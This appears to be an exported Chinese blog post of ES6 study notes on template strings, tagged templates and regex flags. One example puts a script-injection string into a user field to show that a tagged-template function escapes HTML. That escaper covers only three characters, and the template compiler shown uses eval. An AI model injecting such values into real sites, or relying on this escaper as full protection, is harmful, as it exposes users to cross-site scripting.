<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> tmpl = <span class="function"><span class="params">addrs</span> =&gt;</span> <span class="string">`</span></span><br><span class="line"><span class="string">  &lt;table&gt;</span></span><br><span class="line"><span class="string">  <span class="subst">$&#123;addrs.map(addr =&gt; <span class="string">`</span></span></span></span><br><span class="line"><span class="string"><span class="subst"><span class="string">    &lt;tr&gt;&lt;td&gt;<span class="subst">$&#123;addr.first&#125;</span>&lt;/td&gt;&lt;/tr&gt;</span></span></span></span><br><span class="line"><span class="string"><span class="subst"><span class="string">    &lt;tr&gt;&lt;td&gt;<span class="subst">$&#123;addr.last&#125;</span>&lt;/td&gt;&lt;/tr&gt;</span></span></span></span><br><span class="line"><span class="string"><span class="subst"><span class="string">  `</span>).join(<span class="string">&#x27;&#x27;</span>)&#125;</span></span></span><br><span class="line"><span class="string">  &lt;/table&gt;</span></span><br><span class="line"><span class="string">`</span>;</span><br></pre></td></tr></table></figure>
<p>上面代码中，模板字符串的变量之中，又嵌入了另一个模板字符串，使用方法如下。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> data = [</span><br><span class="line">    &#123; <span class="attr">first</span>: <span class="string">&#x27;&lt;Jane&gt;&#x27;</span>, <span class="attr">last</span>: <span class="string">&#x27;Bond&#x27;</span> &#125;,</span><br><span class="line">    &#123; <span class="attr">first</span>: <span class="string">&#x27;Lars&#x27;</span>, <span class="attr">last</span>: <span class="string">&#x27;&lt;Croft&gt;&#x27;</span> &#125;,</span><br><span class="line">];</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(tmpl(data));</span><br><span class="line"><span class="comment">// &lt;table&gt;</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">//   &lt;tr&gt;&lt;td&gt;&lt;Jane&gt;&lt;/td&gt;&lt;/tr&gt;</span></span><br><span class="line"><span class="comment">//   &lt;tr&gt;&lt;td&gt;Bond&lt;/td&gt;&lt;/tr&gt;</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">//   &lt;tr&gt;&lt;td&gt;Lars&lt;/td&gt;&lt;/tr&gt;</span></span><br><span class="line"><span class="comment">//   &lt;tr&gt;&lt;td&gt;&lt;Croft&gt;&lt;/td&gt;&lt;/tr&gt;</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// &lt;/table&gt;</span></span><br></pre></td></tr></table></figure>
<p>如果需要引用模板字符串本身，在需要时执行，可以写成函数。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> func = <span class="function">(<span class="params">name</span>) =&gt;</span> <span class="string">`Hello <span class="subst">$&#123;name&#125;</span>!`</span>;</span><br><span class="line">func(<span class="string">&#x27;Jack&#x27;</span>) <span class="comment">// &quot;Hello Jack!&quot;</span></span><br></pre></td></tr></table></figure>
<p>上面代码中，模板字符串写成了一个函数的返回值。执行这个函数，就相当于执行这个模板字符串了。</p>
<h4 id="4-6-实例：模板编译"><a href="#4-6-实例：模板编译" class="headerlink" title="4.6 实例：模板编译"></a>4.6 实例：模板编译</h4><p>下面，我们来看一个通过模板字符串，生成正式模板的实例。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> template = <span class="string">`</span></span><br><span class="line"><span class="string">&lt;ul&gt;</span></span><br><span class="line"><span class="string">  &lt;% for(let i=0; i &lt; data.supplies.length; i++) &#123; %&gt;</span></span><br><span class="line"><span class="string">    &lt;li&gt;&lt;%= data.supplies[i] %&gt;&lt;/li&gt;</span></span><br><span class="line"><span class="string">  &lt;% &#125; %&gt;</span></span><br><span class="line"><span class="string">&lt;/ul&gt;</span></span><br><span class="line"><span class="string">`</span>;</span><br></pre></td></tr></table></figure>
<p>上面代码在模板字符串之中，放置了一个常规模板。该模板使用<code>&lt;%...%&gt;</code>放置 JavaScript 代码，使用<code>&lt;%= ... %&gt;</code>输出 JavaScript 表达式。</p>
<p>怎么编译这个模板字符串呢？</p>
<p>一种思路是将其转换为 JavaScript 表达式字符串。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">echo(<span class="string">&#x27;&lt;ul&gt;&#x27;</span>);</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">let</span> i=<span class="number">0</span>; i &lt; data.supplies.length; i++) &#123;</span><br><span class="line">  echo(<span class="string">&#x27;&lt;li&gt;&#x27;</span>);</span><br><span class="line">  echo(data.supplies[i]);</span><br><span class="line">  echo(<span class="string">&#x27;&lt;/li&gt;&#x27;</span>);</span><br><span class="line">&#125;;</span><br><span class="line">echo(<span class="string">&#x27;&lt;/ul&gt;&#x27;</span>);</span><br></pre></td></tr></table></figure>
<p>这个转换使用正则表达式就行了。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> evalExpr = <span class="regexp">/&lt;%=(.+?)%&gt;/g</span>;</span><br><span class="line"><span class="keyword">let</span> expr = <span class="regexp">/&lt;%([\s\S]+?)%&gt;/g</span>;</span><br><span class="line"></span><br><span class="line">template = template</span><br><span class="line">  .replace(evalExpr, <span class="string">&#x27;`); \n  echo( $1 ); \n  echo(`&#x27;</span>)</span><br><span class="line">  .replace(expr, <span class="string">&#x27;`); \n $1 \n  echo(`&#x27;</span>);</span><br><span class="line"></span><br><span class="line">template = <span class="string">&#x27;echo(`&#x27;</span> + template + <span class="string">&#x27;`);&#x27;</span>;</span><br></pre></td></tr></table></figure>
<p>然后，将<code>template</code>封装在一个函数里面返回，就可以了。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> script =</span><br><span class="line"><span class="string">`(function parse(data)&#123;</span></span><br><span class="line"><span class="string">  let output = &quot;&quot;;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">  function echo(html)&#123;</span></span><br><span class="line"><span class="string">    output += html;</span></span><br><span class="line"><span class="string">  &#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">  <span class="subst">$&#123; template &#125;</span></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">  return output;</span></span><br><span class="line"><span class="string">&#125;)`</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> script;</span><br></pre></td></tr></table></figure>
<p>将上面的内容拼装成一个模板编译函数<code>compile</code>。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">compile</span>(<span class="params">template</span>)</span>&#123;</span><br><span class="line">  <span class="keyword">const</span> evalExpr = <span class="regexp">/&lt;%=(.+?)%&gt;/g</span>;</span><br><span class="line">  <span class="keyword">const</span> expr = <span class="regexp">/&lt;%([\s\S]+?)%&gt;/g</span>;</span><br><span class="line"></span><br><span class="line">  template = template</span><br><span class="line">    .replace(evalExpr, <span class="string">&#x27;`); \n  echo( $1 ); \n  echo(`&#x27;</span>)</span><br><span class="line">    .replace(expr, <span class="string">&#x27;`); \n $1 \n  echo(`&#x27;</span>);</span><br><span class="line"></span><br><span class="line">  template = <span class="string">&#x27;echo(`&#x27;</span> + template + <span class="string">&#x27;`);&#x27;</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">let</span> script =</span><br><span class="line">  <span class="string">`(function parse(data)&#123;</span></span><br><span class="line"><span class="string">    let output = &quot;&quot;;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    function echo(html)&#123;</span></span><br><span class="line"><span class="string">      output += html;</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    <span class="subst">$&#123; template &#125;</span></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    return output;</span></span><br><span class="line"><span class="string">  &#125;)`</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> script;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><code>compile</code>函数的用法如下。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> parse = <span class="built_in">eval</span>(compile(template));</span><br><span class="line">div.innerHTML = parse(&#123; <span class="attr">supplies</span>: [ <span class="string">&quot;broom&quot;</span>, <span class="string">&quot;mop&quot;</span>, <span class="string">&quot;cleaner&quot;</span> ] &#125;);</span><br><span class="line"><span class="comment">//   &lt;ul&gt;</span></span><br><span class="line"><span class="comment">//     &lt;li&gt;broom&lt;/li&gt;</span></span><br><span class="line"><span class="comment">//     &lt;li&gt;mop&lt;/li&gt;</span></span><br><span class="line"><span class="comment">//     &lt;li&gt;cleaner&lt;/li&gt;</span></span><br><span class="line"><span class="comment">//   &lt;/ul&gt;</span></span><br></pre></td></tr></table></figure>
<h4 id="4-7-标签模板"><a href="#4-7-标签模板" class="headerlink" title="4.7 标签模板"></a>4.7 标签模板</h4><p>模板字符串的功能，不仅仅是上面这些。它可以紧跟在一个函数名后面，该函数将被调用来处理这个模板字符串。这被称为“标签模板”功能（tagged template）。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">alert<span class="string">`hello`</span></span><br><span class="line"><span class="comment">// 等同于</span></span><br><span class="line">alert([<span class="string">&#x27;hello&#x27;</span>])</span><br></pre></td></tr></table></figure>
<p>标签模板其实不是模板，而是函数调用的一种特殊形式。“标签”指的就是函数，紧跟在后面的模板字符串就是它的参数。</p>
<p>但是，如果模板字符里面有变量，就不是简单的调用了，而是会将模板字符串先处理成多个参数，再调用函数。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> a = <span class="number">5</span>;</span><br><span class="line"><span class="keyword">let</span> b = <span class="number">10</span>;</span><br><span class="line"></span><br><span class="line">tag<span class="string">`Hello <span class="subst">$&#123; a + b &#125;</span> world <span class="subst">$&#123; a * b &#125;</span>`</span>;</span><br><span class="line"><span class="comment">// 等同于</span></span><br><span class="line">tag([<span class="string">&#x27;Hello &#x27;</span>, <span class="string">&#x27; world &#x27;</span>, <span class="string">&#x27;&#x27;</span>], <span class="number">15</span>, <span class="number">50</span>);</span><br></pre></td></tr></table></figure>
<p>上面代码中，模板字符串前面有一个标识名<code>tag</code>，它是一个函数。整个表达式的返回值，就是<code>tag</code>函数处理模板字符串后的返回值。</p>
<p>函数<code>tag</code>依次会接收到多个参数。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">tag</span>(<span class="params">stringArr, value1, value2</span>)</span>&#123;</span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 等同于</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">tag</span>(<span class="params">stringArr, ...values</span>)</span>&#123;</span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><code>tag</code>函数的第一个参数是一个数组，该数组的成员是模板字符串中那些没有变量替换的部分，也就是说，变量替换只发生在数组的第一个成员与第二个成员之间、第二个成员与第三个成员之间，以此类推。</p>
<p><code>tag</code>函数的其他参数，都是模板字符串各个变量被替换后的值。由于本例中，模板字符串含有两个变量，因此<code>tag</code>会接受到<code>value1</code>和<code>value2</code>两个参数。</p>
<p>tag函数所有参数的实际值如下。</p>
<ul>
<li>第一个参数：<code>[&#39;Hello &#39;, &#39; world &#39;, &#39;&#39;]</code></li>
<li>第二个参数: 15</li>
<li>第三个参数：50</li>
</ul>
<p>也就是说，<code>tag</code>函数实际上以下面的形式调用。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">tag([<span class="string">&#x27;Hello &#x27;</span>, <span class="string">&#x27; world &#x27;</span>, <span class="string">&#x27;&#x27;</span>], <span class="number">15</span>, <span class="number">50</span>)</span><br></pre></td></tr></table></figure>
<p>我们可以按照需要编写<code>tag</code>函数的代码。下面是<code>tag</code>函数的一种写法，以及运行结果。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> a = <span class="number">5</span>;</span><br><span class="line"><span class="keyword">let</span> b = <span class="number">10</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">tag</span>(<span class="params">s, v1, v2</span>) </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(s[<span class="number">0</span>]);</span><br><span class="line">  <span class="built_in">console</span>.log(s[<span class="number">1</span>]);</span><br><span class="line">  <span class="built_in">console</span>.log(s[<span class="number">2</span>]);</span><br><span class="line">  <span class="built_in">console</span>.log(v1);</span><br><span class="line">  <span class="built_in">console</span>.log(v2);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="string">&quot;OK&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">tag<span class="string">`Hello <span class="subst">$&#123; a + b &#125;</span> world <span class="subst">$&#123; a * b&#125;</span>`</span>;</span><br><span class="line"><span class="comment">// &quot;Hello &quot;</span></span><br><span class="line"><span class="comment">// &quot; world &quot;</span></span><br><span class="line"><span class="comment">// &quot;&quot;</span></span><br><span class="line"><span class="comment">// 15</span></span><br><span class="line"><span class="comment">// 50</span></span><br><span class="line"><span class="comment">// &quot;OK&quot;</span></span><br></pre></td></tr></table></figure>
<p>下面是一个更复杂的例子。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> total = <span class="number">30</span>;</span><br><span class="line"><span class="keyword">let</span> msg = passthru<span class="string">`The total is <span class="subst">$&#123;total&#125;</span> (<span class="subst">$&#123;total*<span class="number">1.05</span>&#125;</span> with tax)`</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">passthru</span>(<span class="params">literals</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">let</span> result = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">  <span class="keyword">let</span> i = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">while</span> (i &lt; literals.length) &#123;</span><br><span class="line">    result += literals[i++];</span><br><span class="line">    <span class="keyword">if</span> (i &lt; <span class="built_in">arguments</span>.length) &#123;</span><br><span class="line">      result += <span class="built_in">arguments</span>[i];</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">msg <span class="comment">// &quot;The total is 30 (31.5 with tax)&quot;</span></span><br></pre></td></tr></table></figure>
<p>上面这个例子展示了，如何将各个参数按照原来的位置拼合回去。</p>
<p><code>passthru</code>函数采用 rest 参数的写法如下。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">passthru</span>(<span class="params">literals, ...values</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">let</span> output = <span class="string">&quot;&quot;</span>;</span><br><span class="line">  <span class="keyword">let</span> index;</span><br><span class="line">  <span class="keyword">for</span> (index = <span class="number">0</span>; index &lt; values.length; index++) &#123;</span><br><span class="line">    output += literals[index] + values[index];</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  output += literals[index]</span><br><span class="line">  <span class="keyword">return</span> output;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>“标签模板”的一个重要应用，就是过滤 HTML 字符串，防止用户输入恶意内容。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> message =</span><br><span class="line">  SaferHTML<span class="string">`&lt;p&gt;<span class="subst">$&#123;sender&#125;</span> has sent you a message.&lt;/p&gt;`</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">SaferHTML</span>(<span class="params">templateData</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">let</span> s = templateData[<span class="number">0</span>];</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">1</span>; i &lt; <span class="built_in">arguments</span>.length; i++) &#123;</span><br><span class="line">    <span class="keyword">let</span> arg = <span class="built_in">String</span>(<span class="built_in">arguments</span>[i]);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Escape special characters in the substitution.</span></span><br><span class="line">    s += arg.replace(<span class="regexp">/&amp;/g</span>, <span class="string">&quot;&amp;amp;&quot;</span>)</span><br><span class="line">            .replace(<span class="regexp">/&lt;/g</span>, <span class="string">&quot;&amp;lt;&quot;</span>)</span><br><span class="line">            .replace(<span class="regexp">/&gt;/g</span>, <span class="string">&quot;&amp;gt;&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Don&#x27;t escape special characters in the template.</span></span><br><span class="line">    s += templateData[i];</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> s;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>上面代码中，<code>sender</code>变量往往是用户提供的，经过<code>SaferHTML</code>函数处理，里面的特殊字符都会被转义。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> sender = <span class="string">&#x27;&lt;script&gt;alert(&quot;abc&quot;)&lt;/script&gt;&#x27;</span>; <span class="comment">// 恶意代码</span></span><br><span class="line"><span class="keyword">let</span> message = SaferHTML<span class="string">`&lt;p&gt;<span class="subst">$&#123;sender&#125;</span> has sent you a message.&lt;/p&gt;`</span>;</span><br><span class="line"></span><br><span class="line">message</span><br><span class="line"><span class="comment">// &lt;p&gt;&amp;lt;script&amp;gt;alert(&quot;abc&quot;)&amp;lt;/script&amp;gt; has sent you a message.&lt;/p&gt;</span></span><br></pre></td></tr></table></figure>
<p>标签模板的另一个应用，就是多语言转换（国际化处理）。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">i18n<span class="string">`Welcome to <span class="subst">$&#123;siteName&#125;</span>, you are visitor number <span class="subst">$&#123;visitorNumber&#125;</span>!`</span></span><br><span class="line"><span class="comment">// &quot;欢迎访问xxx，您是第xxxx位访问者！&quot;</span></span><br></pre></td></tr></table></figure>
<p>模板字符串本身并不能取代 Mustache 之类的模板库，因为没有条件判断和循环处理功能，但是通过标签函数，你可以自己添加这些功能。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 下面的hashTemplate函数</span></span><br><span class="line"><span class="comment">// 是一个自定义的模板处理函数</span></span><br><span class="line"><span class="keyword">let</span> libraryHtml = hashTemplate<span class="string">`</span></span><br><span class="line"><span class="string">  &lt;ul&gt;</span></span><br><span class="line"><span class="string">    #for book in <span class="subst">$&#123;myBooks&#125;</span></span></span><br><span class="line"><span class="string">      &lt;li&gt;&lt;i&gt;#&#123;book.title&#125;&lt;/i&gt; by #&#123;book.author&#125;&lt;/li&gt;</span></span><br><span class="line"><span class="string">    #end</span></span><br><span class="line"><span class="string">  &lt;/ul&gt;</span></span><br><span class="line"><span class="string">`</span>;</span><br></pre></td></tr></table></figure>
<p>除此之外，你甚至可以使用标签模板，在 JavaScript 语言之中嵌入其他语言。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">jsx<span class="string">`</span></span><br><span class="line"><span class="string">  &lt;div&gt;</span></span><br><span class="line"><span class="string">    &lt;input</span></span><br><span class="line"><span class="string">      ref=&#x27;input&#x27;</span></span><br><span class="line"><span class="string">      onChange=&#x27;<span class="subst">$&#123;<span class="built_in">this</span>.handleChange&#125;</span>&#x27;</span></span><br><span class="line"><span class="string">      defaultValue=&#x27;<span class="subst">$&#123;<span class="built_in">this</span>.state.value&#125;</span>&#x27; /&gt;</span></span><br><span class="line"><span class="string">      <span class="subst">$&#123;<span class="built_in">this</span>.state.value&#125;</span></span></span><br><span class="line"><span class="string">   &lt;/div&gt;</span></span><br><span class="line"><span class="string">`</span></span><br></pre></td></tr></table></figure>
<p>上面的代码通过<code>jsx</code>函数，将一个 DOM 字符串转为 React 对象。你可以在 GitHub 找到<code>jsx</code>函数的具体实现。</p>
<p>下面则是一个假想的例子，通过<code>java</code>函数，在 JavaScript 代码之中运行 Java 代码。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">java<span class="string">`</span></span><br><span class="line"><span class="string">class HelloWorldApp &#123;</span></span><br><span class="line"><span class="string">  public static void main(String[] args) &#123;</span></span><br><span class="line"><span class="string">    System.out.println(&quot;Hello World!&quot;); // Display the string.</span></span><br><span class="line"><span class="string">  &#125;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">`</span></span><br><span class="line">HelloWorldApp.main();</span><br></pre></td></tr></table></figure>
<p>模板处理函数的第一个参数（模板字符串数组），还有一个<code>raw</code>属性。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">console</span>.log<span class="string">`123`</span></span><br><span class="line"><span class="comment">// [&quot;123&quot;, raw: Array[1]]</span></span><br></pre></td></tr></table></figure>
<p>上面代码中，<code>console.log</code>接受的参数，实际上是一个数组。该数组有一个<code>raw</code>属性，保存的是转义后的原字符串。</p>
<p>请看下面的例子。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">tag<span class="string">`First line\nSecond line`</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">tag</span>(<span class="params">strings</span>) </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(strings.raw[<span class="number">0</span>]);</span><br><span class="line">  <span class="comment">// strings.raw[0] 为 &quot;First line\\nSecond line&quot;</span></span><br><span class="line">  <span class="comment">// 打印输出 &quot;First line\nSecond line&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>上面代码中，<code>tag</code>函数的第一个参数<code>strings</code>，有一个<code>raw</code>属性，也指向一个数组。该数组的成员与<code>strings</code>数组完全一致。比如，<code>strings</code>数组是<code>[&quot;First line\nSecond line&quot;]</code>，那么<code>strings.raw</code>数组就是<code>[&quot;First line\\nSecond line&quot;]</code>。两者唯一的区别，就是字符串里面的斜杠都被转义了。比如，<code>strings.raw</code> 数组会将<code>\n</code>视为<code>\\</code>和<code>n</code>两个字符，而不是换行符。这是为了方便取得转义之前的原始模板而设计的。</p>
<h4 id="4-8-模板字符串的限制"><a href="#4-8-模板字符串的限制" class="headerlink" title="4.8 模板字符串的限制"></a>4.8 模板字符串的限制</h4><p>前面提到标签模板里面，可以内嵌其他语言。但是，模板字符串默认会将字符串转义，导致无法嵌入其他语言。</p>
<p>举例来说，标签模板里面可以嵌入 LaTEX 语言。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">latex</span>(<span class="params">strings</span>) </span>&#123;</span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> <span class="built_in">document</span> = latex<span class="string">`</span></span><br><span class="line"><span class="string">\newcommand&#123;\fun&#125;&#123;\textbf&#123;Fun!&#125;&#125;  // 正常工作</span></span><br><span class="line"><span class="string">\newcommand&#123;\unicode&#125;&#123;\textbf&#123;Unicode!&#125;&#125; // 报错</span></span><br><span class="line"><span class="string">\newcommand&#123;\xerxes&#125;&#123;\textbf&#123;King!&#125;&#125; // 报错</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Breve over the h goes \u&#123;h&#125;ere // 报错</span></span><br></pre></td></tr></table></figure>
<p>上面代码中，变量<code>document</code>内嵌的模板字符串，对于 LaTEX 语言来说完全是合法的，但是 JavaScript 引擎会报错。原因就在于字符串的转义。</p>
<p>模板字符串会将<code>\u00FF</code>和<code>\u&#123;42&#125;</code>当作 Unicode 字符进行转义，所以<code>\unicode</code>解析时报错；而<code>\x56</code>会被当作十六进制字符串转义，所以<code>\xerxes</code>会报错。也就是说，<code>\u</code>和<code>\x</code>在 LaTEX 里面有特殊含义，但是 JavaScript 将它们转义了。</p>
<p>为了解决这个问题，ES2018 放松了对标签模板里面的字符串转义的限制。如果遇到不合法的字符串转义，就返回<code>undefined</code>，而不是报错，并且从<code>raw</code>属性上面可以得到原始字符串。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">tag</span>(<span class="params">strs</span>) </span>&#123;</span><br><span class="line">  strs[<span class="number">0</span>] === <span class="literal">undefined</span></span><br><span class="line">  strs.raw[<span class="number">0</span>] === <span class="string">&quot;\\unicode and \\u&#123;55&#125;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">tag<span class="string">`\unicode and \u&#123;55&#125;`</span></span><br></pre></td></tr></table></figure>
<p>上面代码中，模板字符串原本是应该报错的，但是由于放松了对字符串转义的限制，所以不报错了，JavaScript 引擎将第一个字符设置为<code>undefined</code>，但是<code>raw</code>属性依然可以得到原始字符串，因此<code>tag</code>函数还是可以对原字符串进行处理。</p>
<p>注意，这种对字符串转义的放松，只在标签模板解析字符串时生效，不是标签模板的场合，依然会报错。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> bad = <span class="string">`bad escape sequence: \unicode`</span>; <span class="comment">// 报错</span></span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>JS-ES6</category>
      </categories>
      <tags>
        <tag>JS-ES6 字符串的扩展</tag>
      </tags>
  </entry>
  <entry>
    <title>打卡0076</title>
    <url>/2021/06/20/%E6%89%93%E5%8D%A10076/</url>
    <content><![CDATA[<p><font color=#f58220>但因热爱，愿迎万难</font></p>
<h2 id="ES6"><a href="#ES6" class="headerlink" title="ES6"></a>ES6</h2><h3 id="6-正则的扩展"><a href="#6-正则的扩展" class="headerlink" title="6.正则的扩展"></a>6.正则的扩展</h3><h4 id="6-1-RegExp-构造函数"><a href="#6-1-RegExp-构造函数" class="headerlink" title="6.1 RegExp 构造函数"></a>6.1 RegExp 构造函数</h4><p>在 ES5 中，<code>RegExp</code>构造函数的参数有两种情况。</p>
<p>第一种情况是，参数是字符串，这时第二个参数表示正则表达式的修饰符（flag）。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> regex = <span class="keyword">new</span> <span class="built_in">RegExp</span>(<span class="string">&#x27;xyz&#x27;</span>, <span class="string">&#x27;i&#x27;</span>);</span><br><span class="line"><span class="comment">// 等价于</span></span><br><span class="line"><span class="keyword">var</span> regex = <span class="regexp">/xyz/i</span>;</span><br></pre></td></tr></table></figure>
<p>第二种情况是，参数是一个正则表示式，这时会返回一个原有正则表达式的拷贝。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> regex = <span class="keyword">new</span> <span class="built_in">RegExp</span>(<span class="regexp">/xyz/i</span>);</span><br><span class="line"><span class="comment">// 等价于</span></span><br><span class="line"><span class="keyword">var</span> regex = <span class="regexp">/xyz/i</span>;</span><br></pre></td></tr></table></figure>
<p>但是，ES5 不允许此时使用第二个参数添加修饰符，否则会报错。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> regex = <span class="keyword">new</span> <span class="built_in">RegExp</span>(<span class="regexp">/xyz/</span>, <span class="string">&#x27;i&#x27;</span>);</span><br><span class="line"><span class="comment">// Uncaught TypeError: Cannot supply flags when constructing one RegExp from another</span></span><br></pre></td></tr></table></figure>
<p>ES6 改变了这种行为。如果<code>RegExp</code>构造函数第一个参数是一个正则对象，那么可以使用第二个参数指定修饰符。而且，返回的正则表达式会忽略原有的正则表达式的修饰符，只使用新指定的修饰符。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">new</span> <span class="built_in">RegExp</span>(<span class="regexp">/abc/ig</span>, <span class="string">&#x27;i&#x27;</span>).flags</span><br><span class="line"><span class="comment">// &quot;i&quot;</span></span><br></pre></td></tr></table></figure>
<p>上面代码中，原有正则对象的修饰符是<code>ig</code>，它会被第二个参数<code>i</code>覆盖。</p>
<span id="more"></span>
<h4 id="6-2-字符串的正则方法"><a href="#6-2-字符串的正则方法" class="headerlink" title="6.2 字符串的正则方法"></a>6.2 字符串的正则方法</h4><p>ES6 出现之前，字符串对象共有 4 个方法，可以使用正则表达式：<code>match()</code>、<code>replace()</code>、<code>search()</code>和<code>split()</code>。</p>
<p>ES6 将这 4 个方法，在语言内部全部调用<code>RegExp</code>的实例方法，从而做到所有与正则相关的方法，全都定义在<code>RegExp</code>对象上。</p>
<ul>
<li><code>String.prototype.match</code> 调用 <code>RegExp.prototype[Symbol.match]</code></li>
<li><code>String.prototype.replace</code> 调用 <code>RegExp.prototype[Symbol.replace]</code></li>
<li><code>String.prototype.search</code> 调用 <code>RegExp.prototype[Symbol.search]</code></li>
<li><code>String.prototype.split</code> 调用 <code>RegExp.prototype[Symbol.split]</code></li>
</ul>
<h4 id="6-3-u-修饰符"><a href="#6-3-u-修饰符" class="headerlink" title="6.3 u 修饰符"></a>6.3 u 修饰符</h4><p>ES6 对正则表达式添加了<code>u</code>修饰符，含义为“Unicode 模式”，用来正确处理大于<code>\uFFFF</code>的 Unicode 字符。也就是说，会正确处理四个字节的 UTF-16 编码。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">/^\uD83D/u.test(<span class="string">&#x27;\uD83D\uDC2A&#x27;</span>) <span class="comment">// false</span></span><br><span class="line">/^\uD83D/.test(<span class="string">&#x27;\uD83D\uDC2A&#x27;</span>) <span class="comment">// true</span></span><br></pre></td></tr></table></figure>
<p>上面代码中，<code>\uD83D\uDC2A</code>是一个四个字节的 UTF-16 编码，代表一个字符。但是，ES5 不支持四个字节的 UTF-16 编码，会将其识别为两个字符，导致第二行代码结果为<code>true</code>。加了<code>u</code>修饰符以后，ES6 就会识别其为一个字符，所以第一行代码结果为<code>false</code>。</p>
